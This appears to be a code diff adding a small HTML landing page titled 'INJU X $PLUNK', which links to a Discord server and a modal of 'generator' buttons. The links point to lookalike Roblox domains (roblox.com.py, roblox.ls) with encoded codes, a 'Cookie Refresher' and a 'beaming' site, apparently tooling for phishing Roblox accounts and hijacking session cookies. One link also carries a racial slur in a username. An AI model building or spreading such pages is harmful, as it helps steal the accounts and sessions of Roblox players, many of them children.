@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>INJU X $PLUNK - Rainbow</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, red, orange, yellow, green, blue, indigo, violet);
+      font-family: 'Segoe UI', sans-serif;
+      color: white;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      margin: 50px auto;
+      background-color: rgba(0, 0, 0, 0.7);
+      border-radius: 20px;
+      padding: 20px;
+      width: 90%;
+      max-width: 600px;
+    }
+
+    .title {
+      font-size: 32px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      background: linear-gradient(to right, red, orange, yellow, green, blue, indigo, violet);
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+
+    .button {
+      padding: 10px 20px;
+      border-radius: 10px;
+      margin: 10px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      background: linear-gradient(45deg, red, yellow, green);
+      color: black;
+    }
+
+    .button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(45deg, blue, magenta, cyan);
+      color: white;
+    }
+
+    .status {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 10px;
+      border-radius: 10px;
+      margin: 15px 0;
+    }
+
+    .status span {
+      display: block;
+      margin: 5px;
+      color: lightgreen;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-content {
+      background: linear-gradient(to bottom right, #ff0080, #7928ca);
+      padding: 30px;
+      border-radius: 15px;
+      max-width: 500px;
+      width: 90%;
+      color: white;
+      text-align: center;
+      position: relative;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 20px;
+      cursor: pointer;
+      color: white;
+    }
+
+    .modal .button {
+      margin: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="title">INJU X $PLUNK</div>
+
+    <!-- Discord Button -->
+    <a href="https://discord.gg/mvsJHzCZ" target="_blank">
+      <button class="button">Join Our Discord</button>
+    </a>
+
+    <!-- Status Display -->
+    <div class="status">
+      <span>🔌 Main site: Online</span>
+      <span>🌐 $PLUNK site: Online</span>
+      <span>📁 Backup site: Online</span>
+    </div>
+
+    <!-- Generator Button that triggers the modal -->
+    <button class="button" onclick="openModal()">⚡ Generator</button>
+
+    <!-- Other Buttons -->
+    <a href="https://app.genn.lu/tools/refresher"><button class="button">🍪 Cookie Refresher</button></a>
+    <a href="https://variares-hyperlink-9jmo2y.vercel.app/"><button class="button">🔗 Link Shortener</button></a>
+  </div>
+
+  <!-- Hidden Modal -->
+  <div class="modal" id="generatorModal">
+    <div class="modal-content">
+      <span class="close-btn" onclick="closeModal()">×</span>
+      <h3>Choose Generator Type</h3>
+      <a href="https://app.genn.lu/auth/inju20"><button class="button">👑 INJU SITE</button></a>
+      <a href="https://app.beaming.pro/u/Negro88706"><button class="button">⭐ $PLUNK SITE</button></a>
+      <a href="https://roblox.com.py/dashboard/?code=MzYxMjc0NzEzNzIzOTczMjAxOF84ODgzNTE5MTg3NTg4NDU0ODg2"><button class="button">⚡ Main site</button></a>
+      <a href="https://roblox.ls/dashboard/?code=MzA3MzA0MDE4NjA2MjgyODczM184ODgzNTE5MTg3NTg4NDU0ODg2"><button class="button">📁 Backup site</button></a>
+      <p style="margin-top: 10px; font-size: 12px;">⭐ Premium sites offer the best performance and features</p>
+    </div>
+  </div>
+
+  <!-- JavaScript to control modal -->
+  <script>
+    function openModal() {
+      document.getElementById("generatorModal").style.display = "flex";
+    }
+    function closeModal() {
+      document.getElementById("generatorModal").style.display = "none";
+    }
+
+    // Optional: close modal when clicking outside content
+    window.onclick = function(event) {
+      const modal = document.getElementById("generatorModal");
+      if (event.target === modal) {
+        closeModal();
+      }
+    }
+  </script>
+</body>
+</html>
